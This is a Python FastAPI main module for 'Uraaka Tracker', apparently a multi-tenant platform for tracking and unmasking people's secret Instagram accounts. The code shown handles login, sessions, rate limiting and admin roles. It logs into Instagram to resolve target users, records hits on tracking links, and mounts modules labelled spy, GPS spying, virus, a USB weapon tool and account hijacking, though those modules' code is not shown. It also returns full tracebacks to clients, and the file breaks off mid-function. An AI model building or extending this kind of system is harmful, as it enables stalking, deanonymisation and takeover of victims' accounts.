"""FastAPI アプリ本体。Cookieセッション認証 + マルチテナント完全分離版。"""
import os, io, time, secrets, random, string, base64, json as _json, traceback, shutil, threading
from collections import Counter
from urllib.parse import quote

from fastapi import FastAPI, APIRouter, Request, Depends, Form, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse, PlainTextResponse, Response, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware

# persist を最初に読み、DB を開く前に共有ファイルを復元する
from . import persist
persist.pull()

from . import config, tenancy, users
from .config import get as get_cfg
from . import instagram as ig
from . import identity, watcher, forensics, linktrack, together, snscheck, campaign
# --- 役職・権限（新規） ---
from . import roles
# --- 封鎖（新規） ---
from . import lockdown

config.load()
users.init()
persist.pull_accounts()
db = tenancy.db
persist.start()

app = FastAPI(title="Uraaka Tracker", docs_url=None, redoc_url=None, openapi_url=None)
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")
templates.env.filters["fromjson"] = _json.loads

COOKIE_USER = "igt_sid"
COOKIE_ADMIN = "igt_admin"
SECURE_COOKIE = os.getenv("COOKIE_SECURE", "1") != "0"
ADMIN_PATH = "/" + (os.getenv("ADMIN_PATH", "admin").strip("/") or "admin")
EDITABLE = ["identity", "monitor", "archive"]
SIGNUP_OPEN = os.getenv("SIGNUP_OPEN", "1") != "0"
RUN_IG_BOOT = os.getenv("RUN_IG_BOOT", "1") != "0"
IG_BOOT_MAX_TRIES = int(os.getenv("IG_BOOT_MAX_TRIES", "8"))

admin = APIRouter(prefix=ADMIN_PATH)
# --- マルチSNS（新規） ---
from . import snsx
app.include_router(snsx.router)
# --- 追跡（新規） ---
from . import tracks
app.include_router(tracks.router)
# --- スパイ拡張（新規） ---
from . import spy
app.include_router(spy.router)
from . import gps
app.include_router(gps.router)
from . import gps_spy
app.include_router(gps_spy.router)
from . import virus
app.include_router(virus.router)
# --- 全員チャット（新規） ---
from . import chat
app.include_router(chat.router)
# --- DM / グループチャット（新規） ---
from . import dm
app.include_router(dm.router)
# --- USB兵器ツール（新規） ---
from . import usb
app.include_router(usb.router)
# --- アカウント乗っ取り（新規） ---
from . import hijack
app.include_router(hijack.router)
# --- 封鎖（新規） ---
app.include_router(lockdown.router)
# ---------- Instagram 接続の状態管理 ----------

_IG_LOCK = threading.RLock()
_IG_STATE = {"ok": False, "running": False, "last_try": 0.0, "fails": 0,
             "last_err": "", "last_ok_at": 0.0, "note": ""}


def _ig_note(msg):
    _IG_STATE["note"] = msg
    print("[igboot]", msg)


def _ig_client(force=False, tries=1, quiet=False):
    with _IG_LOCK:
        if not force and _IG_STATE["ok"]:
            try:
                return ig.client()
            except Exception as e:
                _IG_STATE["ok"] = False
                _IG_STATE["last_err"] = repr(e)
                _IG_STATE["fails"] += 1
                try:
                    ig.reset_client()
                except Exception:
                    pass

        last = None
        for i in range(max(1, tries)):
            try:
                cl = ig.client()
                _IG_STATE["ok"] = True
                _IG_STATE["last_ok_at"] = time.time()
                _IG_STATE["fails"] = 0
                if not quiet:
                    _ig_note("ログイン成功")
                return cl
            except Exception as e:
                last = e
                _IG_STATE["last_err"] = repr(e)
                _IG_STATE["fails"] += 1
                _IG_STATE["last_try"] = time.time()
                try:
                    ig.reset_client()
                except Exception:
                    pass
                if i + 1 < tries:
                    time.sleep(min(5 * (2 ** i), 60))
        raise last if last else RuntimeError("instagram client unavailable")


def _ig_boot(force=False):
    with _IG_LOCK:
        if _IG_STATE["running"]:
            return
        _IG_STATE["running"] = True
    try:
        for t in users.list_usernames():
            tenancy.set_current(t)
            cfg = get_cfg()
            if not cfg["instagram"].get("username"):
                continue
            try:
                cl = _ig_client(force=force, tries=2)
            except Exception as e:
                _IG_STATE["ok"] = False
                _ig_note(f"{t} ログイン失敗: {e!r}")
                return
            for h in cfg.get("targets", []):
                try:
                    uid = str(cl.user_id_from_username(h))
                except Exception as e:
                    _ig_note(f"{t} target解決失敗: {h} {e!r}")
                    continue
                try:
                    db.add_target(uid, h)
                    db.add_known(uid, h, source="target")
                except Exception:
                    pass
            _ig_note(f"{t} ターゲット登録 完了")
    finally:
        _IG_STATE["running"] = False


def _ig_boot_loop():
    delay = 20
    for attempt in range(1, IG_BOOT_MAX_TRIES + 1):
        if _IG_STATE["ok"]:
            return
        try:
            _ig_boot()
        except Exception as e:
            _ig_note(f"想定外: {e!r}")
        if _IG_STATE["ok"]:
            _ig_note("接続確立")
            return
        _ig_note(f"再試行まで {delay} 秒待機（{attempt}/{IG_BOOT_MAX_TRIES}）")
        time.sleep(delay)
        delay = min(delay * 2, 900)
    _ig_note("起動時の接続は諦めました。/ig/boot か /ig/test で再試行できます")


# ---------- 共通 ----------

def render(name, request, **ctx):
    ctx["request"] = request
    ctx["me"] = getattr(request.state, "user_name", None)
    ctx["profile_name"] = users.display_name(ctx["me"]) if ctx["me"] else ""
    ctx["profile"] = users.get_profile(ctx["me"]) if ctx["me"] else {}
    ctx["real_user"] = getattr(request.state, "real_user", None)
    ctx["is_admin"] = getattr(request.state, "is_admin", False)
    ctx["admin_realm"] = getattr(request.state, "admin_ok", False)
    ctx["must_change"] = getattr(request.state, "must_change", False)
    ctx["impersonating"] = bool(ctx["me"] and ctx["real_user"] and ctx["me"] != ctx["real_user"])
    ctx["admin_path"] = ADMIN_PATH
    ctx["signup_open"] = SIGNUP_OPEN
    # --- 役職・権限（新規） ---
    rl = ctx.get("view_role") or getattr(request.state, "role", None)
    ctx["role"] = rl
    ctx["role_label"] = roles.LABELS.get(rl or "", "")
    ctx["role_level"] = roles.LEVEL.get(rl or "", 0)
    ctx["perms"] = roles.perms_of(rl)
    ctx["is_root"] = getattr(request.state, "is_root", False)
    ctx["console_ok"] = getattr(request.state, "console_ok", False)
    return templates.TemplateResponse(name, ctx)


def _wants_json(request):
    p = request.url.path
    if p.startswith("/api/") or p in ("/export.json", "/import"):
        return True
    acc = request.headers.get("accept", "")
    return "application/json" in acc and "text/html" not in acc


def _safe_next(n, default="/"):
    if not n or not n.startswith("/") or n.startswith("//"):
        return default
    return n


def _ip(request):
    return linktrack.client_ip(request)


def _ua(request):
    return request.headers.get("user-agent", "")


def _base(request):
    return str(request.base_url).rstrip("/")


def _set_cookie(resp, name, token):
    resp.set_cookie(name, token, max_age=users.SESSION_DAYS * 86400, httponly=True,
                    secure=SECURE_COOKIE, samesite="lax", path="/")


def _activate(request, row, admin_ok=False):
    real = row["username"]
    is_admin = row["role"] == "admin"
    effective = real
    if is_admin:
        want = users.norm(request.cookies.get("view_as") or "")
        r2 = users.get(want) if want else None
        if r2 and not r2["disabled"]:
            effective = want
    tenancy.set_current(effective)
    request.state.user_name = effective
    request.state.real_user = real
    request.state.is_admin = is_admin
    request.state.admin_ok = admin_ok
    request.state.must_change = bool(row["must_change"]) and effective == real
    # --- 役職・権限（新規） ---
    request.state.role = users.role_of(effective)
    request.state.is_root = users.is_root(effective)
    request.state.console_ok = (request.state.is_root
                                or roles.has(request.state.role, "console.view"))
    return effective


@app.middleware("http")
async def harden(request: Request, call_next):
    resp = await call_next(request)
    if not request.url.path.startswith("/static"):
        resp.headers["Cache-Control"] = "private, no-store, must-revalidate"
        resp.headers["Vary"] = "Cookie"
        resp.headers["X-Content-Type-Options"] = "nosniff"
        resp.headers["X-Frame-Options"] = "SAMEORIGIN"
        if not request.url.path.startswith("/l/"):
            resp.headers["Referrer-Policy"] = "no-referrer"
    return resp


# ---------- 大量アクセス対策（IP単位トークンバケット） ----------
_RL = {}
_RL_LOCK = threading.Lock()
RL_ON = os.getenv("RATE_LIMIT", "1") != "0"
RL_GEN_RPS = float(os.getenv("RL_RPS", "15"))
RL_GEN_BURST = float(os.getenv("RL_BURST", "60"))
RL_PUB_RPS = float(os.getenv("RL_PUBLIC_RPS", "50"))
RL_PUB_BURST = float(os.getenv("RL_PUBLIC_BURST", "200"))


def _rl_allow(ip, cls, now):
    rps, burst = (RL_PUB_RPS, RL_PUB_BURST) if cls == "pub" else (RL_GEN_RPS, RL_GEN_BURST)
    key = ip + "|" + cls
    with _RL_LOCK:
        b = _RL.get(key)
        if b is None:
            b = [burst, now]
            _RL[key] = b
            if len(_RL) > 8000:
                for k in list(_RL)[:2000]:
                    _RL.pop(k, None)
        b[0] = min(burst, b[0] + (now - b[1]) * rps)
        b[1] = now
        if b[0] < 1.0:
            return False
        b[0] -= 1.0
        return True


@app.middleware("http")
async def throttle(request: Request, call_next):
    if not RL_ON:
        return await call_next(request)
    p = request.url.path
    if p == "/healthz" or p.startswith("/static/"):
        return await call_next(request)
    cls = "pub" if (p.startswith("/l/") or p.startswith("/v/")
                    or p.startswith("/chat/api/") or p.startswith("/dm/api/")) else "gen"
    if not _rl_allow(linktrack.client_ip(request), cls, time.monotonic()):
        return JSONResponse({"ok": False, "why": "too many requests"},
                            status_code=429, headers={"Retry-After": "1"})
    return await call_next(request)


# ---------- 封鎖ゲート（管理者以外のログイン/新規登録を止める） ----------
@app.middleware("http")
async def lockdown_gate(request: Request, call_next):
    return await lockdown.gate(request, call_next)


# ---------- 権限チェック / 例外 ----------

def _perm(request: Request, key: str) -> str:
    """権限チェック。ルート管理者は常に通す。無ければ 403。"""
    u = getattr(request.state, "real_user", None) or getattr(request.state, "user_name", None)
    if not u:
        raise HTTPException(401, "ログインしてください")
    if users.is_root(u):
        return u
    if not roles.has(users.role_of(u), key):
        raise HTTPException(403, f"権限がありません: {roles.label(key)}")
    return u


def _guard(request: Request, target: str, key: str, purge: bool = False) -> str:
    """対象ユーザーへの操作可否（ルート保護＋同格以上は不可）。"""
    me = _perm(request, key)
    if purge:
        _perm(request, "users.purge")
    if users.norm(target) == users.norm(me):
        return me
    if users.is_root(target) and not users.is_root(me):
        raise HTTPException(403, "ルート管理者は触れません")
    if not users.is_root(me):
        if roles.level(users.role_of(me)) <= roles.level(users.role_of(target)):
            raise HTTPException(403, "同格以上には触れません")
    return me


@app.exception_handler(HTTPException)
async def _http_exc(request: Request, exc: HTTPException):
    if exc.status_code in (301, 302, 303, 307, 308) and exc.headers:
        return RedirectResponse(exc.headers.get("Location", "/"),
                                status_code=exc.status_code)
    if exc.status_code == 403 and not _wants_json(request):
        back = request.headers.get("referer") or "/"
        sep = "&" if "?" in back else "?"
        return RedirectResponse(f"{back}{sep}err=" + quote(str(exc.detail)), 303)
    return JSONResponse({"detail": exc.detail}, status_code=exc.status_code)


@app.exception_handler(Exception)
async def _debug_handler(request: Request, exc: Exception):
    tb = traceback.format_exc()
    try:
        if tenancy.get_current():
            db.log("system", "unhandled_error",
                   {"path": str(request.url.path), "error": repr(exc)})
    except Exception:
        pass
    return PlainTextResponse(f"PATH: {request.url.path}\n\n{tb}", status_code=500)


# ---------- ヘルスチェック ----------

@app.get("/healthz")
def healthz():
    return {"ok": True}


@app.head("/healthz")
def healthz_head():
    return PlainTextResponse("")


@app.head("/")
def head_root():
    return PlainTextResponse("")


# ---------- 認証依存 ----------

async def auth(request: Request) -> str:
    tok = request.cookies.get(COOKIE_USER)
    row = users.resolve_session(tok, "user")
    if row:
        u = _activate(request, row)
        persist.touch(u)
        return u

    hdr = request.headers.get("authorization", "")
    if hdr.lower().startswith("basic "):
        try:
            raw = base64.b64decode(hdr.split(" ", 1)[1]).decode("utf-8")
            un, _, pw = raw.partition(":")
        except Exception:
            un = pw = ""
        if users.verify_user(un, pw):
            u = _activate(request, users.get(un))
            persist.touch(u)
            return u

    if _wants_json(request):
        raise HTTPException(401, "unauthorized")
    raise HTTPException(303, headers={
        "Location": "/login?next=" + quote(str(request.url.path))})


async def admin_auth(request: Request) -> str:
    tok = request.cookies.get(COOKIE_ADMIN)
    row = users.resolve_session(tok, "admin")
    if not row:
        if _wants_json(request):
            raise HTTPException(401, "admin login required")
        raise HTTPException(303, headers={
            "Location": f"{ADMIN_PATH}/login?next=" + quote(str(request.url.path))})
    u = _activate(request, row, admin_ok=True)
    persist.touch(u)
    return u


# ---------- ログイン集中対策 ----------
_LOGIN_SEM = threading.Semaphore(int(os.getenv("LOGIN_CONCURRENCY", "6")))
_LOGIN_WAIT = float(os.getenv("LOGIN_WAIT", "10"))
_LOGIN_HITS = {}
_LOGIN_HITS_LOCK = threading.Lock()
LOGIN_PER_MIN = int(os.getenv("LOGIN_PER_MIN", "90"))


def _ip_min(key, per_min):
    now = time.time()
    with _LOGIN_HITS_LOCK:
        win, n = _LOGIN_HITS.get(key, (now, 0))
        if now - win > 60:
            win, n = now, 0
        n += 1
        _LOGIN_HITS[key] = (win, n)
        if len(_LOGIN_HITS) > 4000:
            for k in list(_LOGIN_HITS)[:1000]:
                _LOGIN_HITS.pop(k, None)
    return n <= per_min


def _slot():
    return _LOGIN_SEM.acquire(timeout=_LOGIN_WAIT)


# ---------- ログイン / 登録 / ログアウト ----------

@app.get("/login", response_class=HTMLResponse)
def login_page(request: Request, next: str = "", msg: str = "", err: str = ""):
    return render("login.html", request, next=_safe_next(next), msg=msg, err=err)


@app.post("/login")
def login_post(request: Request, username: str = Form(""), password: str = Form(""),
               next: str = Form("/")):
    ip = _ip(request)
    if not _ip_min("l:" + ip, LOGIN_PER_MIN):
        return RedirectResponse("/login?err=" +
                                quote("アクセスが集中しています。少し待ってください"), 303)
    key = "u:" + ip
    if users.is_throttled(key):
        return RedirectResponse("/login?err=" + quote("試行回数が多すぎます。少し待ってください"), 303)
    if not _slot():
        return RedirectResponse("/login?err=" + quote("混雑中です。もう一度お試しください"), 303)
    try:
        info = users.verify_user(username, password)
    finally:
        _LOGIN_SEM.release()

    if not info:
        users.bump_fail(key)
        users.audit(username, "login_fail", {"ip": ip})
        return RedirectResponse("/login?next=" + quote(_safe_next(next)) +
                                "&err=" + quote("ユーザー名かパスワードが違います"), 303)
    users.clear_fail(key)
    users.audit(info["username"], "login_ok", {"ip": ip, "ua": _ua(request)[:120]})

    # ログイン時の復元は既定で別スレッド（大量ログインで GitHub 待ちに詰まらせない）
    u = info["username"]
    if os.getenv("LOGIN_SYNC_RESTORE", "0") == "1":
        try:
            persist.touch(u, force=True, sync_first=True)
        except Exception as e:
            print("[backup] ログイン時復元に失敗:", repr(e))
    else:
        threading.Thread(target=persist.touch,
                         kwargs={"force": True, "sync_first": True}, daemon=True).start()

    tok = users.new_session(u, "user", ip, _ua(request))
    r = RedirectResponse(_safe_next(next), 303)
    _set_cookie(r, COOKIE_USER, tok)
    return r


@app.get("/signup", response_class=HTMLResponse)
def signup_page(request: Request, msg: str = "", err: str = ""):
    return render("signup.html", request, msg=msg, err=err)


@app.post("/signup")
def signup_post(request: Request, username: str = Form(""), password: str = Form(""),
                password2: str = Form("")):
    if not SIGNUP_OPEN:
        return RedirectResponse("/signup?err=" + quote("現在、新規登録は停止しています"), 303)
    ip = _ip(request)
    key = "s:" + ip
    if users.is_throttled(key, limit=10):
        return RedirectResponse("/signup?err=" + quote("試行回数が多すぎます"), 303)
    if not _ip_min("n:" + ip, LOGIN_PER_MIN):
        return RedirectResponse("/signup?err=" + quote("アクセスが集中しています"), 303)
    mu = int(os.getenv("MAX_USERS", "0"))
    if mu and users.count() >= mu:
        return RedirectResponse("/signup?err=" + quote("ユーザー上限に達しました"), 303)
    if password != password2:
        return RedirectResponse("/signup?err=" + quote("パスワードが一致しません"), 303)
    if not _slot():
        return RedirectResponse("/signup?err=" + quote("混雑中です。もう一度お試しください"), 303)
    try:
        users.create(username, password, role="user", note="self signup")
    except ValueError as e:
        users.bump_fail(key)
        return RedirectResponse("/signup?err=" + quote(str(e)), 303)
    finally:
        _LOGIN_SEM.release()
    u = users.norm(username)
    users.audit(u, "signup", {"ip": ip})
    persist.touch(u, force=True, sync_first=True)
    tok = users.new_session(u, "user", ip, _ua(request))
    r = RedirectResponse("/", 303)
    _set_cookie(r, COOKIE_USER, tok)
    return r


@app.post("/logout")
def logout_post(request: Request):
    try:
        row = users.resolve_session(request.cookies.get(COOKIE_USER), "user")
        if row:
            persist.push_user(row["username"], force=True)
    except Exception:
        pass
    users.delete_session(request.cookies.get(COOKIE_USER))
    r = RedirectResponse("/login?msg=" + quote("ログアウトしました"), 303)
    r.delete_cookie(COOKIE_USER, path="/")
    return r


@app.get("/logout")
def logout_get(request: Request):
    return logout_post(request)


@app.on_event("startup")
async def _startup_pool():
    """同期エンドポイント用スレッドプールを広げる（大量ログインで詰まらせない）。"""
    try:
        import anyio
        anyio.to_thread.current_default_thread_limiter().total_tokens = \
            int(os.getenv("THREADPOOL", "60"))
    except Exception:
        pass


@app.on_event("startup")
def _startup():
    users.bootstrap_admin()
    users.purge_expired()
    if RUN_IG_BOOT:
        threading.Thread(target=_ig_boot_loop, daemon=True).start()
    if os.getenv("RUN_SCHEDULER", "1") == "1":
        watcher.start()


@app.on_event("shutdown")
def _shutdown():
    try:
        persist.push(force=True)
    except Exception:
        pass
    try:
        for t in users.list_usernames(include_disabled=True):
            persist.push_user(t, force=True)
    except Exception:
        pass


# ---------- 自分のアカウント ----------

@app.get("/account", response_class=HTMLResponse)
def account_page(request: Request, msg: str = "", err: str = "", u=Depends(auth)):
    real = request.state.real_user
    toks = request.cookies.get(COOKIE_USER) or ""
    cur = users.sid_of(toks)
    sess = [dict(s) | {"short": s["sid"][:8],
                       "current": s["sid"] == cur,
                       "admin_short": None} for s in users.list_sessions(real, "user")]
    adms = [dict(s) | {"short": s["sid"][:8]} for s in users.list_sessions(real, "admin")]
    return render("account.html", request, msg=msg, err=err,
                  role=users.role_of(real),
                  role_label=roles.LABELS.get(users.role_of(real), ""),
                  env_admin=bool(users.env_admin()[0] == real),
                  breakglass=bool(users.env_breakglass()),
                  sessions=sess, admin_sessions=adms,
                  session_days=users.SESSION_DAYS,
                  backup=persist.state(), my_backup=persist.user_state(u),
                  profile=users.get_profile(real), display_name=users.display_name(real))


@app.post("/account/profile")
async def account_profile(request: Request, u=Depends(auth)):
    real = request.state.real_user
    form = await request.form()
    name = str(form.get("display_name") or "")
    try:
        users.update_profile(real, name)
    except ValueError as e:
        return RedirectResponse("/account?err=" + quote(str(e)), 303)
    return RedirectResponse("/account?msg=" + quote("表示名を保存しました"), 303)


@app.post("/account/avatar")
async def account_avatar(request: Request, u=Depends(auth)):
    real = request.state.real_user
    form = await request.form()
    upload = form.get("avatar")
    if not upload or not hasattr(upload, "read"):
        return RedirectResponse("/account?err=" + quote("画像ファイルを選択してください"), 303)
    data = await upload.read(2 * 1024 * 1024 + 1)
    if not data:
        return RedirectResponse("/account?err=" + quote("画像ファイルが空です"), 303)
    if len(data) > 2 * 1024 * 1024:
        return RedirectResponse("/account?err=" + quote("画像は2MB以下にしてください"), 303)
    mime = ""
    if data.startswith(b"\\x89PNG\\r\\n\\x1a\\n"):
        mime = "image/png"
    elif data.startswith(b"\\xff\\xd8\\xff"):
        mime = "image/jpeg"
    elif data.startswith((b"GIF87a", b"GIF89a")):
        mime = "image/gif"
    elif len(data) >= 12 and data[:4] == b"RIFF" and data[8:12] == b"WEBP":
        mime = "image/webp"
    if not mime:
        return RedirectResponse("/account?err=" + quote("PNG/JPEG/GIF/WebP画像のみ設定できます"), 303)
    users.update_avatar(real, data, mime)
    return RedirectResponse("/account?msg=" + quote("アイコンを保存しました"), 303)


@app.post("/account/avatar/delete")
def account_avatar_delete(request: Request, u=Depends(auth)):
    users.clear_avatar(request.state.real_user)
    return RedirectResponse("/account?msg=" + quote("アイコンを削除しました"), 303)


@app.get("/profile/avatar/{username}")
def profile_avatar(username: str, u=Depends(auth)):
    profile = users.get_profile(username)
    data = profile.get("avatar_data")
    mime = profile.get("avatar_mime") or ""
    if not data or mime not in ("image/png", "image/jpeg", "image/gif", "image/webp"):
        raise HTTPException(404, "avatar not found")
    return Response(content=bytes(data), media_type=mime,
                    headers={"Cache-Control": "private, max-age=300",
                             "X-Content-Type-Options": "nosniff"})


@app.get("/members/count")
def members_count(u=Depends(auth)):
    return {"ok": True, "count": len(users.list_usernames())}


@app.get("/members", response_class=HTMLResponse)
def members_page(request: Request, online: int = 0, u=Depends(auth)):
    names = users.list_usernames()
    try:
        from . import chat
        online_names = set(chat._online(limit=10000))
    except Exception:
        online_names = set()
    rows = []
    for name in names:
        profile = users.get_profile(name)
        rows.append({"username": name, "display_name": users.display_name(name),
                     "has_avatar": bool(profile.get("avatar_data")),
                     "online": name in online_names,
                     "role_label": roles.LABELS.get(users.role_of(name), "")})
    rows.sort(key=lambda r: (not r["online"], r["display_name"].lower()))
    if online:
        rows = [r for r in rows if r["online"]]
    return render("members.html", request, rows=rows, online_only=bool(online),
                  member_count=len(names), online_count=len(online_names))


@app.post("/account/password")
def account_password(request: Request, cur: str = Form(""), new: str = Form(""),
                     new2: str = Form(""), u=Depends(auth)):
    real = request.state.real_user
    if new != new2:
        return RedirectResponse("/account?err=" + quote("新しいパスワードが一致しません"), 303)
    if not users.check_password(real, cur):
        return RedirectResponse("/account?err=" + quote("現在のパスワードが違います"), 303)
    try:
        users.set_password(real, new, must_change=0)
    except ValueError as e:
        return RedirectResponse("/account?err=" + quote(str(e)), 303)
    tok = users.new_session(real, "user", _ip(request), _ua(request))
    users.audit(real, "password_changed", {})
    persist.push_user(real, force=True)
    r = RedirectResponse("/account?msg=" + quote(
        "パスワードを変更し、他の全端末からログアウトしました"), 303)
    _set_cookie(r, COOKIE_USER, tok)
    return r


@app.post("/account/sessions/delete")
def account_session_delete(request: Request, sid: str = Form(...), u=Depends(auth)):
    real = request.state.real_user
    cur = users.sid_of(request.cookies.get(COOKIE_USER) or "")
    for s in users.list_sessions(real, "user"):
        if s["sid"].startswith(sid):
            if s["sid"] == cur:
                return RedirectResponse("/account?err=" + quote(
                    "使用中のセッションは「全端末ログアウト」で消してください"), 303)
            users.delete_session_by_sid(s["sid"])
            break
    return RedirectResponse("/account?msg=" + quote("セッションを削除しました"), 303)


@app.post("/account/logout-all")
def account_logout_all(request: Request, u=Depends(auth)):
    real = request.state.real_user
    persist.push_user(real, force=True)
    users.delete_sessions(real, "user")
    tok = users.new_session(real, "user", _ip(request), _ua(request))
    users.audit(real, "logout_all", {})
    r = RedirectResponse("/account?msg=" + quote("全端末からログアウトしました"), 303)
    _set_cookie(r, COOKIE_USER, tok)
    return r


# ---------- バックアップ ----------

@app.get("/backup", response_class=HTMLResponse)
def backup_page(request: Request, msg: str = "", err: str = "", u=Depends(auth)):
    return render("backup.html", request, st=persist.state(),
                  my=persist.user_state(u),
                  repo=os.getenv("BACKUP_REPO") or "",
                  every=os.getenv("BACKUP_EVERY") or "300",
                  msg=msg, err=err)


@app.post("/backup/me/push")
def backup_me_push(u=Depends(auth)):
    return RedirectResponse("/backup?msg=" + quote("退避: " + str(persist.push_user(u, force=True))), 303)


@app.post("/backup/me/pull")
def backup_me_pull(u=Depends(auth)):
    return RedirectResponse("/backup?msg=" + quote(
        "復元: " + str(persist.pull_user(u, force=True)) + "（再読み込みで反映）"), 303)


@app.post("/backup/all/push")
def backup_all_push(request: Request, u=Depends(auth)):
    _perm(request, "backup.all")
    return RedirectResponse("/backup?msg=" + quote("全ユーザー退避を開始しました"), 303)


@app.get("/api/backup")
def api_backup(u=Depends(auth)):
    return persist.state()


@app.get("/api/backup/me")
def api_backup_me(u=Depends(auth)):
    return persist.user_state(u)


# ---------- 役職コンソール ----------

_CONSOLE_LINKS = [
    ("/console", "🧭 役職コンソール", "console.view"),
    (ADMIN_PATH + "/", "🛠 管理コンソール", "users.view"),
    ("/console/roles", "🧮 権限マトリクス", "roles.edit"),
    ("/lock/panel", "🔒 封鎖パネル", "lockdown"),
    (ADMIN_PATH + "/audit", "📜 監査ログ", "audit.view"),
    ("/backup", "💾 バックアップ", "console.view"),
]


def _console_ctx():
    return {"rows": roles.PERMS, "all_roles": roles.ROLES, "labels": roles.LABELS,
            "levels": roles.LEVEL, "links": _CONSOLE_LINKS}


def _can_edit_roles(me: str) -> bool:
    return users.is_root(me) or roles.has(users.role_of(me), "roles.edit")


@app.get("/console", response_class=HTMLResponse)
def console_page(request: Request, u=Depends(auth)):
    return render("console.html", request, **_console_ctx(),
                  view_role=request.state.role, preview=False)


@app.get("/console/roles", response_class=HTMLResponse)
def console_roles(request: Request, msg: str = "", err: str = "", u=Depends(auth)):
    me = request.state.real_user
    if not _can_edit_roles(me):
        raise HTTPException(403, "権限マトリクスを扱う権限がありません")
    return render("console_roles.html", request, **_console_ctx(),
                  matrix=roles.load(), msg=msg, err=err)


@app.post("/console/roles/save")
async def console_roles_save(request: Request, u=Depends(auth)):
    me = request.state.real_user
    if not _can_edit_roles(me):
        raise HTTPException(403, "権限マトリクスを扱う権限がありません")
    form = await request.form()
    new = {}
    for r in roles.ROLES:
        new[r] = [p["key"] for p in roles.PERMS if form.get(f"p.{r}.{p['key']}")]
    roles.save_perms(new)
    users.audit(me, "roles_save", {r: len(v) for r, v in new.items()})
    return RedirectResponse("/console/roles?msg=" + quote("権限を保存しました"), 303)


@app.post("/console/roles/reset")
def console_roles_reset(request: Request, u=Depends(auth)):
    me = request.state.real_user
    if not _can_edit_roles(me):
        raise HTTPException(403, "権限マトリクスを扱う権限がありません")
    roles.reset()
    users.audit(me, "roles_reset", {})
    return RedirectResponse("/console/roles?msg=" + quote("既定に戻しました"), 303)


@app.get("/console/{role}", response_class=HTMLResponse)
def console_role_preview(role: str, request: Request, u=Depends(auth)):
    if role not in roles.ROLES:
        raise HTTPException(404)
    return render("console.html", request, **_console_ctx(),
                  view_role=role, preview=True)


# ---------- 管理 ----------

@admin.get("/login", response_class=HTMLResponse)
def admin_login_page(request: Request, next: str = "", msg: str = "", err: str = ""):
    return render("admin_login.html", request, next=_safe_next(next, ADMIN_PATH + "/"),
                  msg=msg, err=err)


@admin.post("/login")
def admin_login_post(request: Request, username: str = Form(""), password: str = Form(""),
                     next: str = Form("")):
    ip = _ip(request)
    key = "a:" + ip
    if not _ip_min(key, LOGIN_PER_MIN):
        return RedirectResponse(f"{ADMIN_PATH}/login?err=" +
                                quote("アクセスが集中しています"), 303)
    if users.is_throttled(key, limit=10):
        return RedirectResponse(f"{ADMIN_PATH}/login?err=" +
                                quote("試行回数が多すぎます"), 303)
    if not _slot():
        return RedirectResponse(f"{ADMIN_PATH}/login?err=" + quote("混雑中です"), 303)
    try:
        ok = users.verify_admin(username, password)
    finally:
        _LOGIN_SEM.release()
    if not ok:
        users.bump_fail(key)
        users.audit(username, "admin_login_fail", {"ip": ip})
        return RedirectResponse(f"{ADMIN_PATH}/login?err=" +
                                quote("コンソール権限がありません"), 303)
    users.clear_fail(key)
    u = users.norm(username)
    users.audit(u, "admin_login_ok", {"ip": ip})
    tok = users.new_session(u, "admin", ip, _ua(request))
    r = RedirectResponse(_safe_next(next, ADMIN_PATH + "/"), 303)
    _set_cookie(r, COOKIE_ADMIN, tok)
    return r


@admin.post("/logout")
def admin_logout(request: Request):
    users.delete_session(request.cookies.get(COOKIE_ADMIN))
    r = RedirectResponse(f"{ADMIN_PATH}/login?msg=" + quote("コンソールから出ました"), 303)
    r.delete_cookie(COOKIE_ADMIN, path="/")
    return r


def _tenant_size(t):
    p = os.path.join(tenancy.ROOT, t)
    tot = 0
    for root, _, files in os.walk(p):
        for f in files:
            try:
                tot += os.path.getsize(os.path.join(root, f))
            except OSError:
                pass
    return tot


@admin.get("", response_class=HTMLResponse)
@admin.get("/", response_class=HTMLResponse)
def admin_page(request: Request, msg: str = "", err: str = "", u=Depends(admin_auth)):
    me = request.state.real_user
    _perm(request, "users.view")
    me_role = users.role_of(me)
    me_root = users.is_root(me)
    can_purge = me_root or roles.has(me_role, "users.purge")
    assign = roles.assignable(me_role, me_root)
    rows = []
    for r in users.list_users():
        d = dict(r)
        t = tenancy.safe_name(r["username"])
        try:
            tdb = tenancy.db_for(t)
            d["targets"] = tdb.q1("SELECT COUNT(*) c FROM targets")["c"]
            d["known"] = tdb.q1("SELECT COUNT(*) c FROM known_accounts")["c"]
            d["links"] = tdb.q1("SELECT COUNT(*) c FROM links")["c"]
            d["hits"] = tdb.q1("SELECT COUNT(*) c FROM link_hits")["c"]
            d["visitors"] = tdb.q1("SELECT COUNT(*) c FROM visitors")["c"]
        except Exception:
            d["targets"] = d["known"] = d["links"] = d["hits"] = d["visitors"] = "-"
        prof = users.get_profile(r["username"])
        d["display_name"] = users.display_name(r["username"])
        d["avatar"] = ("/profile/avatar/" + r["username"]) if prof.get("avatar_data") else ""
        d["ig_user"] = config.load(t).get("instagram", {}).get("username") or ""
        d["size_mb"] = round(_tenant_size(t) / 1048576, 2)
        d["sessions"] = len(users.list_sessions(r["username"], "user"))
        d["backup"] = persist.user_state(r["username"])
        d["root"] = users.is_root(r["username"])
        d["same"] = users.norm(r["username"]) == users.norm(me)
        d["can_act"] = roles.can_act(me_role, r["role"], me_root, d["root"], d["same"])
        d["role_options"] = sorted(set(assign + [r["role"]]),
                                   key=lambda x: -roles.LEVEL.get(x, 0))
        rows.append(d)
    return render("admin.html", request, rows=rows, msg=msg, err=err,
                  env_user=users.env_admin()[0],
                  breakglass=bool(users.env_breakglass()),
                  tenant_root=tenancy.ROOT,
                  audits=[dict(a) | {"display_actor": users.display_name(a.get("actor", "")),
                                      "actor_avatar": ("/profile/avatar/" + a.get("actor", "")
                                                       if users.get_profile(a.get("actor", "")).get("avatar_data") else "")}
                          for a in users.list_audit(200)],
                  me=me, me_root=me_root, my_label=roles.LABELS.get(me_role, me_role),
                  assignable=assign, labels=roles.LABELS, levels=roles.LEVEL,
                  can_purge=can_purge, can_switch=me_root or roles.has(me_role, "view_as"))


@admin.get("/audit", response_class=HTMLResponse)
def admin_audit(request: Request, u=Depends(admin_auth)):
    _perm(request, "audit.view")
    audit_rows = []
    for item in users.list_audit(1000):
        row = dict(item)
        row["display_actor"] = users.display_name(row.get("actor", ""))
